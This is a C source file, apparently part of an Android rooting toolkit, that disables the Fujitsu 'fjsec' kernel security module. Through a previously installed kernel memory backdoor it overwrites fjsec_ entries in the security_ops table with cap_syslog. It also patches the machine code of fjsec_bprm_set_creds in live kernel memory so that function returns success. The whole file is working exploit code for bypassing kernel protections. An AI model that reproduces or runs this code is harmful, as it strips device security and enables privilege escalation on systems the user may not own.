#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "device_database/device_database.h"
#include "backdoor_mmap.h"
#include "libkallsyms/kallsyms_in_memory.h"
#include "fjsec/fjsec.h"

#define NUM_SECURITY_OPS        149

#define RESTRICTED_CAP_PREFIX	"fjsec_"
#define DEFAULT_CAP_FUNCTION	"cap_syslog"
#define BPRM_SET_CREDS_FUNCTION "fjsec_bprm_set_creds"


/*
                      ; begin
c0282250: e9 2d 4m mm     STMPW   [SP], { ..., LR }

                      ; new->securebits &= ~issecure_mas;
c0282490: e5 9n o0 24     LDR     Ro, [Rn, #$24]
c0282494: e3 co o0 10     BIC     Ro, Ro, #$10
c0282498: e5 8n o0 24     STR     Ro, [Ro, #$24]

                      ; modify
c028249c: e3 a0 00 00     MOV     R0, #0
c02824a0: e2 8d dx xx     ADD     SP, SP, #$yy
c02824a4: e8 bd 8m mm     LDMUW   [SP], { ..., PC }

                      ; end
c0282640: e2 8d dx xx     ADD     SP, SP, #$yy
c0282644: e8 bd 8m mm     LDMUW   [SP], { ..., PC }
*/

static int
modify_functions(kallsyms *info)
{
  unsigned long int bprm_set_creds_func;
  unsigned long *mem;
  unsigned long stack_mask = 0x00000fff;
  int modified = 0;

  bprm_set_creds_func = kallsyms_in_memory_lookup_name(info, BPRM_SET_CREDS_FUNCTION);
  if (!bprm_set_creds_func) {
      return modified;
  }

  mem = backdoor_convert_to_mmaped_address((void *)bprm_set_creds_func);

  if ((mem[0] & ~stack_mask) == 0xe92d4000) {
    unsigned long stack_regs;
    unsigned long stack_instr;
    unsigned long return_instr;
    int end;
    bool found;
    int i;

    stack_regs = mem[0] & stack_mask;
    return_instr = 0xe8bd8000 | stack_regs;

    //printf("stack regs = 0x%04x\n", stack_regs);

    for (end = 2; end < 2048 / 4; end++) {
      if ((mem[end] & ~stack_mask) == 0xe8bd8000) {
        break;
      }
    }

    stack_instr = mem[end - 1];

    if (mem[end] != return_instr
     || ((stack_instr & 0xfffff000) != 0xe28dd000)) {
      return modified;
    }

    //printf("stack instr = 0x%08x\n", stack_instr);
    //printf("return instr = 0x%08x\n", return_instr);

    found = false;
    for (i = 1; i < end - 3 - 2; i++) {
      if ((mem[i] & 0xfff00fff) == 0xe5900024) {
        int rn, ro;

	rn = (mem[i] & 0x000f0000) >> 16;
	ro = (mem[i] & 0x0000f000) >> 12;

	if (mem[i + 1] == (0xe3c00010 | (ro << 16) | (ro << 12))
	 && mem[i + 2] == (0xe5800024 | (rn << 16) | (ro << 12))) {
	  //printf("R%d, R%d\n", ro, rn);

	  found = true;
	  break;
	}
      }
    }

    if (!found) {
      return modified;
    }

    mem[i + 3] = 0xe3a00000;
    mem[i + 4] = stack_instr;
    mem[i + 5] = return_instr;

    modified++;
  }

  return modified;
}

bool
unlock_lsm(void)
{
  unsigned long int *security_ops;
  unsigned long int fix_func;
  unsigned long int bprm_set_creds_func;
  kallsyms *info;
  int count = 0;
  int modified;
  int i;

  security_ops = get_fjsec_security_ops();
  if (security_ops == NULL) {
    printf("security_ops: not found\n");
    return false;
  }

  printf("security_ops = %p\n", security_ops);

  security_ops = backdoor_convert_to_mmaped_address(security_ops);

  info = kallsyms_in_memory_init((void *)BACKDOOR_MMAP_ADDRESS, BACKDOOR_MMAP_SIZE);
  if (info == NULL) {
    printf("kallsyms_in_memory_init(): failed\n");
    return false;
  }

  fix_func = kallsyms_in_memory_lookup_name(info, DEFAULT_CAP_FUNCTION);
  if (!fix_func) {
    printf("fix_func <%s>: not found\n", DEFAULT_CAP_FUNCTION);
    return false;
  }

  bprm_set_creds_func = kallsyms_in_memory_lookup_name(info, BPRM_SET_CREDS_FUNCTION);
  if (!bprm_set_creds_func) {
    printf("bprm_set_creds_func <%s>: not found\n", BPRM_SET_CREDS_FUNCTION);
  }

  for (i = SECURITY_OPS_OFFSET; i < SECURITY_OPS_OFFSET + NUM_SECURITY_OPS; i++) {
    if (security_ops[i]) {
      const char *name = kallsyms_in_memory_lookup_address(info, security_ops[i]);
      if (!name) {
        break;
      }

      if (bprm_set_creds_func && security_ops[i] == bprm_set_creds_func) {
        continue;
      }

      printf("0x%08lx = 0x%08lx <%s>\n", (unsigned long int)backdoor_convert_to_kernel_address(&security_ops[i]), security_ops[i], name);

      if (strncmp(name, RESTRICTED_CAP_PREFIX, sizeof (RESTRICTED_CAP_PREFIX) - 1) == 0) {
      	security_ops[i] = (unsigned long int)fix_func;
      	count++;
      }
    }
  }

  printf("  %d functions are fixed.\n", count);

  modified = modify_functions(info);
  count += modified;

  printf("  %d functions are modified.\n", modified);

  kallsyms_in_memory_free(info);

  return count > 0;
}

static bool
do_unlock(void)
{
  bool ret;

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  ret = unlock_lsm();

  backdoor_close_mmap();
  return ret;
}

int
main(int argc, char **argv)
{
  if (!do_unlock()) {
    printf("Failed to unlock LSM protect.\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
